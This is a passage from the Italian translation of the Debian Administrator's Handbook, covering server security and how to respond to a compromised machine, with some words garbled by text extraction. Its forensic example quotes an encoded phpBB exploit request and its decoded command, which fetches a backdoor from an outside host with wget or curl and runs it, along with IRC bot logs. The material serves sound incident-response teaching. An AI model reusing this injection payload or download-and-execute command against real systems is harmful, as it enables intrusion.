     che si connette ad un server IRC e può essere controllato tramite lo stesso canale IRC). Questo bot è
     spesso usato per scambiare les illegali (copie di lms e software non autorizzate, ecc.). Ma un
     attaccante potrebbe spingersi oltre. Difatti l'account www-data non ha l’accesso completo alla
     macchina, pertanto l’attaccante potrebbe tentare di ottenere i privilegi di amministratore. In teoria
     dovrebbe essere impossibile, ma se l'applicazione web non è aggiornata, è probabile che anche il
     kernel o un altro programma non sia aggiornato [e ciò comporta effetti indesiderati]; difatti tale
     contesto si veri ca se l'amministratore nonostante una vulnerabilità nota, sfruttabile solo
     localmente, non effettua i dovuti aggiornamenti dato che il server non ha utenti locali. L'attaccante
     di conseguenza appro tta di questa seconda vulnerabilità per ottenere l'accesso come root.

                                          Questa nozione include qualunque tecnica idonea ad ottenere più diritti rispetto a
                 DIZIONARIO
           Escalation dei                 quelli che un dato utente dovrebbe avere. Il programma sudo è designato a tale
                                          scopo: difatti concede i diritti di amministratore ad alcuni utenti. Ma tale nozione
           privilegi
                                          viene anche usata per descrivere l'azione di un attaccante che sfrutta (exploiting
                                          in inglese) una vulnerabilità per ottenere illegittimamente dei diritti che non
                                          possiede.

     L’attaccante nalmente controlla la macchina; quindi cercherà di mantenere l'accesso privilegiato il
     più lungo possibile. Per fare ciò l’attaccante installa un rootkit, un programma che sostituisce
     alcune componenti del sistema in modo da riottenere facilmente i privilegi di amministratore; inoltre

     Pagina 410 Il Manuale dell’Amministratore di Debian TDAH_1.0
fl
      fi
            fi
                 fi
                      fi
                           fi
                                fi
                                     fi
                                               fi
                                                    fi
                                                         fi
                                                                   fi
                                                                                                         fi
          i rootkits cercano in genere di nascondere la loro esistenza e le tracce dell'intrusione. Il programma
          ps (ormai compromesso) omette di elencare determinati processi, il programma netstat non
          riporta alcune connessioni attive, ecc.
          Grazie ai diritti di root, l'attaccante è stato in grado di consultare l'intero sistema, ma non ha trovato
          i les per lui importanti; onde per cui l’attaccante tenta di accedere ad altre macchine connesse alla
          rete aziendale. Per implementare quanto sopra descritto l’attaccante decide di analizzare l’account
          dell’amministratore e la cronologia dei les per trovare altre macchine regolarmente disponibili.
          Attraverso un programma compromesso l’attaccante sostituisce sudo o ssh per intercettare le
          passwords dell’amministratore, che verranno utilizzate sui servers rilevati… e l’intrusione può
          diffondersi d’ora in poi. Tale contesto viene de nito con un espressione inglese ossia nightmare
          scenario (scenario da incubo, il peggiore contesto veri cabile in assoluto) ed esistono delle
          contromisure per scongiurarlo. I prossimi paragra trattano queste contromisure.

          14.6.3. Scegliere il software con prudenza

          Ora che siete consapevoli dei potenziali problemi di sicurezza, dovrete prestare loro attenzione in
          ogni fase del deployment di un servizio, specialmente nella scelta del software da installare. Diversi
          siti web come SecurityFocus.com elencano le vulnerabilità recentemente scoperte in modo che
          possiate avere un’idea del security track record del software prima del suo deployment.
          Ovviamente dovrete anche bilanciare tali informazioni con la popolarità del suddetto software: più
          utenti utilizzano tale software, più costituisce un potenziale obiettivo, tanto da essere analizzato
          attentamente. Purtroppo anche il software di nicchia potrebbe essere pieno di falle di sicurezza non
          condivise pubblicamente in quanto non ritenuto valevole di un audit di sicurezza.

               DIZIONARIO              Un security audit è una lettura approfondita ed una conseguente valutazione del
           Security Audit              codice sorgente di un software al ne di scovare eventuali vulnerabilità di sicurezza
                                       che potrebbe contenere. Diversi audits sono spesso misure proattive che vengono
                                       condotte per garantire che un software sia conforme a determinati requisiti di
                                       sicurezza.

          Il mondo del software libero offre generalmente un’ampia possibilità di scelta e di conseguenza
          avrete sicuramente modo di scegliere la componente software secondo i vostri criteri.
          Paradossalmente un software più funzionalità offre, più aumentano i rischi di vulnerabilità celate
          nel suo codice; difatti il software più avanzato spesso si rivela controproducente ed è meglio
          privilegiare nella scelta il software più semplice che soddisfa le esigenze reali.

                DIZIONARIO             Un attacco zero-day exploit è dif cile da scongiurare; tale nozione indica un
           Zero-day exploit            attacco che si basa su una vulnerabilità non ancora nota agli autori del software.

          14.6.4. Gestire una macchina nel suo insieme

          La maggior parte delle distribuzioni Linux installa diversi servizi Unix e strumenti per impostazione
          prede nita. In molti casi, i suddetti servizi e strumenti non sono necessari per i propositi
          dell’amministratore in base ai quali con gura la macchina. Spesso le linee guida che trattano

                                                                      TDAH_1.0      Capitolo XIV - Sicurezza Pagina 411
fi
     fi
                             fi
                                  fi
                                          fi
                                               fi
                                                    fi
                                                         fi
                                                              fi
tematiche riguardanti la sicurezza suggeriscono di eliminare tutto ciò che non è necessario. Ossia
non è possibile garantire la sicurezza ad esempio di un FTP server se un altro servizio, tra l’altro
inutilizzato, può essere impiegato per carpire i privilegi dell’amministratore sull’intera macchina.
In base alla stessa logica, la con gurazione di un rewall viene implementata in modo che conceda
solo l'accesso ai servizi che devono essere condivisi pubblicamente.
Le capacità dei computers odierni sono suf cientemente potenti da permettere di poter ospitare più
servizi sulla stessa macchina sica. Questa possibilità è economicamente giusti cata dato che: di
fatto occorre amministrare una sola macchina; viene risparmiato il consumo energetico; ecc. Ma dal
punto di vista della sicurezza, questa scelta è piuttosto onerosa. In pratica un unico servizio
compromesso può comportare dapprima l’accesso alla macchina e poi consentire di compromettere
gli altri servizi ospitati sulla stessa macchina. Per limitare i rischi pertanto è consigliabile isolare i
diversi servizi. Potrete mettere in atto ciò attraverso la virtualizzazione (sistema in cui ciascun
servizio viene ospitato su una macchina virtuale o un container dedicato) o attraverso AppArmor/
SELinux, (sistema in cui ciascun demone dei servizi comprende un set di permessi con gurato ad
hoc).

14.6.5. Gli utenti sono Giocatori/Attori

Quando si parla di sicurezza si pensa subito alla protezione dagli attacchi dei crakers anonimi che
occultano le loro tracce nella giungla di Internet; ma spesso si dimentica che i rischi provengono
dall'interno: un dipendente in procinto di lasciare la società che scarica i les sensibili sui progetti
più importanti per venderli ai concorrenti; un venditore negligente che lascia la sessione aperta
senza bloccarla durante un meeting su un nuovo progetto; un utente distratto che cancella la
directory sbagliata per errore; ecc.

La risposta a questi rischi può essere di natura tecnica: permessi per gli utenti entro e non oltre i
requisiti minimi ed è consigliabile avere backup regolari. Ma nella maggior parte di casi è
consigliabile formare gli utenti contro i rischi.

         BREVE                 Il pacchetto autolog include un programma che disconnette automaticamente gli
       ACCENNO                 utenti inattivi con gurando un delay massimo (ritardo). Implementa inoltre il
 autolog                       killing dei processi utente che persistono dopo la loro ne sessione (in modo da
                               impedire agli utenti di eseguire demoni).

14.6.6. Sicurezza sica

Non ha senso proteggere tutti i servizi e la rete se i computers non sono protetti. È consigliabile
memorizzare i dati più importanti su hard disks hot swap in un array RAID per garantirne la
disponibilità nonostante i potenziali guasti. Ma qualsiasi protocollo di sicurezza è inutile, se dopo
aver fatto tutto ciò, il fattorino della pizza è comunque in grado di entrare nell'edi cio, di accedere
nella sala server e di portare dei dischi selezionati... Chi è autorizzato ad entrare nella sala server?
L’accesso è monitorato? Queste domande (e le conseguenti risposte) devono essere considerate
durante il processo di valutazione di sicurezza sica.

La sicurezza sica include anche la valutazione dei rischi dovuti ad eventi accidentali come gli
incendi. Ciò giusti ca l'archiviazione dei backups in un altro edi cio o almeno in una cassaforte
ignifuga.

Pagina 412 Il Manuale dell’Amministratore di Debian TDAH_1.0
 fi
      fi
           fi
                fi
                     fi
                          fi
                                      fi
                                           fi
                                                fi
                                                     fi
                                                            fi
                                                                      fi
                                                                            fi
                                                                                 fi
                                                                                      fi
     14.6.7. Responsabilità legale

     In qualità di amministratore bene cerete, più o meno implicitamente, della ducia degli utenti locali
     e della rete. Dovrete pertanto evitare qualsiasi negligenza di cui dei malfattori si appro tterebbero.

     Se un attaccante prende il controllo della vostra macchina e la usa come postazione di ricezione/
     trasmissione (denominata “relay system”, sistema a relè) per le sue attività illegali potrebbe
     causarvi problemi legali dato che le vittime di un attacco potrebbero fraintendere e considerarvi gli
     arte ci o i complici dell’attacco. Nel caso più comune, l'attaccante utilizzerà la vostra macchina per
     inviare spam, con degli effetti minimi (come potenziali iscrizioni in black list che vi impedirebbero di
     inviare emails legittime), ma comunque spiacevoli. In altri casi gli attacchi potrebbero essere
     implementati tramite la vostra macchina, ad esempio per attacchi Denial of Service. Ciò può
     comportare: una perdita del fatturato, perché i servizi legittimi non saranno disponibili ed i dati
     andranno persi; un costo economico, perché la parte offesa avvierà una causa legale contro di voi.
     Potrebbero difatti denunciarvi: il titolare dei diritti di un’opera intellettuale se una copia non
     autorizzata viene illegittimamente condivisa attraverso il vostro server; la società impegnata
     contrattualmente alla distribuzione dell’opera intellettuale e costretta a pagare delle penali a seguito
     dell’attacco.

     Purtroppo in questi casi invocare l’innocenza non è suf ciente; dovrete trovare prove evidenti di
     attività sospette di terze parti attraverso il vostro sistema ed individuare il loro indirizzo IP.
     Purtroppo ciò sarà per voi impossibile se imprudentemente trascurerete le raccomandazioni di
     questo capitolo e consentirete all’attaccante di ottenere facilmente un account privilegiato (in
     particolare l'account root) grazie al quale cancellerà le proprie tracce.

     14.7. Come comportarsi con una macchina compromessa

     Nonostante tutta la buona volontà e le attenzioni riservate alla politica di sicurezza, qualsiasi
     amministrazione prima o poi si confronta con un attacco hijacking [l’attaccante dirotta la
     comunicazione fra due entità palesandosi come una di queste - esempi noti sono: l’attacco man in the
     middle; browser hijacking; DNS hijacking; web site hijacking]. Questo paragrafo tratta le
     linee guida per affrontare questi sfortunati eventi.

     14.7.1. Rilevamento ed analisi dell’intrusione del Cracker

     Prima di poter reagire ad un atto di cracking dovrete poter essere in grado di capire se siete una
     vittima di un attacco. Difatti ciò non è scontato, soprattutto se non si dispone di un’infrastruttura di
     monitoraggio adeguata.

     Gli atti di cracking vengono spesso rilevati quando ormai hanno conseguenze dirette sui servizi
     legittimi ospitati sulla macchina: l'improvvisa lentezza della connessione, l'impossibilità di
     login per alcuni utenti o qualsiasi altro malfunzionamento. Di fronte a questi problemi,
     l'amministratore è costretto ad analizzare la macchina ed a studiare meticolosamente le anomalie.
     Solitamente si cerca la presenza di un processo insolito, ad esempio un processo denominato apache
     invece di /usr/sbin/apache2. Dopodiché si annota il numero del process identi er e si veri ca /
     proc/pid/exe per scoprire quale programma il processo sta effettivamente eseguendo:

                                                           TDAH_1.0         Capitolo XIV - Sicurezza Pagina 413
fi
                           fi
                                                 fi
                                                                       fi
                                                                                fi
                                                                                      fi
                                                                                           fi
# ls -al /proc/3719/exe
lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -> /var/tmp/.
-> bash_httpd/psybnc

Un programma installato in /var/tmp/ ed eseguito con l'identità del server web? Nessun dubbio, la
macchina è compromessa.

Questo è un semplice esempio, ma molti altri indizi possono mettere in allerta un amministratore:

• un’opzione di un comando che non funziona più; la versione del software che il comando richiede
   non corrisponde a quella che si presuppone sia installata secondo dpkg;
• un prompt di comandi o il session greeting [l’annuncio per la richiesta di sessione] che indica che
l'ultima connessione proviene da un server remoto in un altro continente;
• gli errori causati da una partizione /tmp/ che risulta contenere copie illegali di lms;
• ecc.

14.7.2. Mettere il server of ine

Nella stragrande maggioranza dei casi, il cracking proviene dalla rete ed una rete funzionante è
indispensabile per l’attaccante per raggiungere i suoi targets [bersagli-obiettivi] (accesso a dati
riservati, condivisione di les illegali, occultazione dell’identità utilizzando la macchina come relay,
ecc.). La disconnessione del computer dalla rete impedirà all'attaccante di raggiungere i suoi
obiettivi qualora ancora non lo avesse fatto.

Questo è possibile solo se avete accesso sico al server. In caso contrario, ad esempio se il server è
ospitato da un hosting provider dall’altra parte del paese o se il server non è raggiungibile per altre
ragioni, potrebbe essere saggio raccogliere le informazioni più importanti (andate a leggere il
paragrafo: 14.7.3, “Preservare tutto ciò che può costituire una prova” a pagina 414; il paragrafo
14.7.5, “Analisi forense” a pagina 415; il paragrafo 14.7.6, “Ricostruzione dello scenario di un
attacco” a pagina 416) e dopodiché isolare il server il più possibile interrompendo il maggior numero
di servizi (solitamente tutto tranne sshd). Un case simile è un grattacapo dato che è impossibile
essere certi che l’attaccante non abbia ottenuto l'accesso SSH come amministratore; è dif cile in
queste condizioni pulire la macchina.

14.7.3. Preservare tutto ciò che può costituire una prova

Se vorrete capire come si è svolto un attacco o adire le vie legali nei confronti degli attaccanti,
dovrete fare una copia di tutti gli elementi importanti: in particolare il contenuto degli hard disks,
l'elenco di tutti i processi in esecuzione e l'elenco di tutte le connessioni aperte. In teoria potreste
includere anche i contenuti della RAM, anche se solitamente non vengono presi in considerazione.
Gli amministratori, in uenzati dallo stress del contesto, potrebbero essere tentati di effettuare dei
controlli sulla macchina compromessa, ma è una pessima idea. Qualunque comando eseguirete

Pagina 414 Il Manuale dell’Amministratore di Debian TDAH_1.0
          fl
               fi
                    fl
                             fi
                                                                         fi
                                                                                 fi
     potrebbe essere a sua volta compromesso e cancellare le prove. Dovrete limitare le veri che ad
     elementi di con gurazione essenziali (netstat -tupan per le connessioni di rete, ps auxf per
     l'elenco dei processi, ls -alR /proc/[0-9]* per informazioni aggiuntive sui programmi in
     esecuzione) e annotare sistematicamente ogni veri ca.

          ATTENZIONE           Potreste essere tentati di analizzare un sistema mentre processa, soprattutto se
      Hot analysis             non si dispone di un accesso sico al server, ma ciò sarebbe inutile: difatti non
      [Analisi da              potrete mai darvi dei programmi installati su un sistema compromesso. Il
                               comando ps ormai compromesso potrebbe occultare qualche processo; oppure il
      remoto - hot
                               comando ls (compromesso) potrebbe omettere qualche le; persino il kernel
      links]                   potrebbe essere compromesso!
                               Se, nonostante ciò, dovrete effettuare un’analisi simile, quanto meno utilizzate dei
                               programmi che non ritenete compromessi. Ad esempio un CD-Rom di ripristino
                               contenente programmi “puliti” o una condivisione di rete con permessi di sola
                               lettura. In ogni caso se il kernel è compromesso anche queste contromisure
                               potrebbero non essere suf cienti.

     Salvati gli elementi "dinamici" più importanti, è necessario memorizzare un'immagine completa
     dell’hard disk. Tale operazione non è attuabile su un’immagine con un le system ancora in
     evoluzione pertanto dovrete effettuarne il remount in modalità di sola lettura. La soluzione più
     semplice è forzare l’arresto del server (dopo aver eseguito sync) e riavviarlo con un CD-Rom di
     ripristino. Dovrete copiare ogni partizione con un tool come ad esempio dd; le immagini potranno
     essere inviate poi ad un altro server (ad esempio con uno strumento come nc). Una soluzione
     alternativa ed ancora più semplice è estrarre il disco dalla macchina e sostituirlo con un disco nuovo
     che può essere riformattato e reinstallato.

     14.7.4. Reinstallazione

     Prima di rimettere online il server, è essenziale reinstallarlo completamente. Difatti se la
     compromissione è grave (ed i privilegi di amministratore sono stati carpiti), non potrete essere mai
     certi di aver eliminato qualsiasi elemento l'attaccante abbia installato ad hoc (come ad esempio delle
     backdoors). Dovrete pertanto installare anche tutti gli ultimi aggiornamenti di sicurezza per
     chiudere la falla che l'attaccante è riuscito a sfruttare. Teoricamente attraverso un'analisi ex ante
     dovreste essere in grado di individuare il vettore dell'attacco in modo da eliminarlo durante
     l’installazione; in pratica solitamente si spera che gli aggiornamenti abbiano risolto la vulnerabilità e
     che di conseguenza siano suf cienti.
     Purtroppo per un server remoto, la reinstallazione non è sempre facile da eseguire; spesso dovrete
     rivolgervi all’assistenza del hosting provider in quanto non tutte le società offrono sistemi di
     reinstallazione automatica.
     Inoltre dovrete fare attenzione a non ripristinare la macchina da backups successivi alla data
     dell’attacco. Idealmente è consigliabile recuperare soltanto i dati e reinstallare il software da un
     supporto di archiviazione.

     14.7.5. Analisi forense

     Ripristinato il servizio, potrete analizzare le immagini del disco del sistema compromesso per
     individuare il vettore dell’attacco. Quando effettuerete il mounting dell’immagine dovrete avere cura
     di utilizzare le opzioni ro, nodev, noexec, noatime in modo da non modi carne il contenuto

                                                              TDAH_1.0          Capitolo XIV - Sicurezza Pagina 415
fi
        fi
                fi
                     fi
                          fi
                                               fi
                                                    fi
                                                                      fi
                                                                           fi
                                                                                          fi
                    (compresi i timestamps di accesso ai le) e non mettere in esecuzione gli eseguibili compromessi.

                    Per ricostruire ef cacemente lo scenario di un attacco, dovrete analizzare tutto ciò che è stato
                    modi cato ed eseguito:

                    • i les .bash_history offrono un’adeguata lettura;
                    • anche l'elenco dei les recentemente creati, modi cati o aperti è pertinente;
                    • il comando strings consente l'identi cazione dei programmi installati dall'attaccante attraverso
                    l’estrazione delle stringhe presenti in un binario;
                    • i log les in /var/log/ consentono di ricostruire una cronologia degli eventi;
                    • in ne alcuni strumenti specializzati consentono di recuperare i les opportunamente cancellati
                      dall’attaccante come i log les.

                    Alcune delle suddette operazioni possono essere svolte attraverso software specializzato. In
                    particolare il pacchetto sleuthkit offre diversi strumenti per analizzare un le system. La GUI
                    Autopsy Forensic Browser (inclusa nel pacchetto autopsy) vi faciliterà nel loro utilizzo.

                    14.7.6. Ricostruzione dello scenario di un attacco

                    Tutti gli elementi raccolti durante l'analisi devono coincidere fra loro come il mosaico di un puzzle: la
                    data di creazione dei primi les sospetti consente attraverso i correlati log les di risalire
                    all’intrusione. Il sottostante esempio “pratico” dovrebbe essere più esauriente rispetto ad un lungo
                    discorso teorico. Pertanto troverete a seguire un estratto di un le access.log di Apache:

                    www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] ”GET /phpbb/viewtopic.
                    -> php?t=10&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr
                    -> (47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr
                    -> (119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr
                    -> (97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr
                    -> (97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr
                    -> (105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr
                    -> (114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr
                    -> (124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr
                    -> (108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr
                    -> (121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr
                    -> (101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr
                    -> (97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr
                    -> (98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)
                    -> %252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)
                    -> %252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)
                    -> %252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252
                    -> echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1” 200 27969
                    -> ”-” ”Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”

                    Il soprastante esempio mostra l’exploit (sfruttamento) di una nota falla di sicurezza di phpBB.

                    Pagina 416 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
     fi
          fi
               fi
                         fi
                              fi
                                   fi
                                        fi
                                              fi
                                                   fi
                                                            fi
                                                                         fi
                                                                              fi
                                                                                     fi
                                                                                          fi
           http://secunia.com/advisories/13239/
           http://www.phpbb.com/phpBB/viewtopic.php?t=240636

     Decodi cando questo lungo URL, è possibile comprendere che l'attaccante è riuscito ad
     implementare diverso codice PHP ossia: system(”cd /tmp;wget gabryk.altervista.org/bd ||
     curl gabryk.altervista.org/bd -o bd;chmod +x bd;./bd &"). Difatti esiste un le bd in
     /tmp/. Inoltre il comando strings /mnt/tmp/bd restituisce, tra le molte stringhe, PsychoPhobia
     Backdoor is starting… Di conseguenza è evidente che si tratta di una backdoor.

     Dopodiché questo accesso è stato utilizzato per scaricare, installare ed eseguire un bot IRC che è
     stato a sua volta collegato a una rete IRC nascosta. Il bot di conseguenza può essere controllato
     attraverso il suddetto protocollo ed istruito per scaricare i les per renderli condivisi. Inoltre il bot
     ha un suo log le:

     ** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it
     -> NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
     ** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.
     -> POOL8250.INTERBUSINESS.IT
     ** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to
     -> 82.50.72.202:1024
     ** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
     ** 2004-11-29-19:50:20: DCC CHAT Correct password
     (...)
     ** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_
     -> DvdScr.avi (713034KB)
     (...)
     ** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi
     -> (666615KB)
     (...)
     ** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9
     -> KB/sec)
     (...)
     ** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec,
     -> 80.2KB/sec)

     Le tracce del log les evidenziano la presenza di due les video che sono stati caricati sul server
     attraverso l’IP 82.50.72.202.

     In aggiunta, l'attaccante ha scaricato un altro paio di les /tmp/pt e /tmp/loginx. Analizzandoli
     con strings sono state trovate tra le stringhe Shellcode placed at 0x%08lx e Now wait for suid
     shell... È evidente che si tratta di programmi che sfruttano le vulnerabilità locali per ottenere i
     privilegi di amministratore. Ma hanno raggiunto il loro obiettivo? In questo caso non è probabile
     dato che nessun les sembrerebbe essere stato modi cato dopo la violazione.

     Nel soprastante esempio è stato possibile ricostruire tutte le fasi dell'intrusione e dedurre che
     l'attaccante è stato in grado di utilizzare il sistema compromesso per 3 giorni; comunque ciò che più
     conta in questa analisi è l’identi cazione della vulnerabilità in modo che l’amministratore possa
     correggerla durante la reinstallazione.

                                                                   TDAH_1.0   Capitolo XIV - Sicurezza Pagina 417
fi
      fi
             fi
              fi
                          fi
                                               fi
                                                    fi
                                                         fi
                                                              fi
                                                                                         fi
         Parole chiave
Backport
Rebuild
Source package
Archivio
Meta-package
Debian Developer
Maintainer
